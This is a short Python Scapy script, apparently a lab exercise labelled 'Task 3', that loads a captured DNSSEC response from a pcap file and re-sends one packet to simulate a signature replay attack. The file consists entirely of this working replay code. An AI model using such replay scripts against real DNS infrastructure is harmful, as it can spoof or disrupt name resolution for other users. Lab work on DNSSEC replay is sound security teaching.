from scapy.all import *

# --- Task 3: Signature Replay Script ---

# Load previously captured DNSSEC response from the pcap file
# This pcap should contain a valid DNS response with RRSIG records
captured_packets = rdpcap("Task3_1.pcap")

# Select the packet to replay — adjust index if needed
# Here, we assume the 3rd packet in the capture is the DNS response (index 2)
replay_packet = captured_packets[2]

# Send the packet to simulate a replay attack
send(replay_packet)

print("Sent 1 packet.")
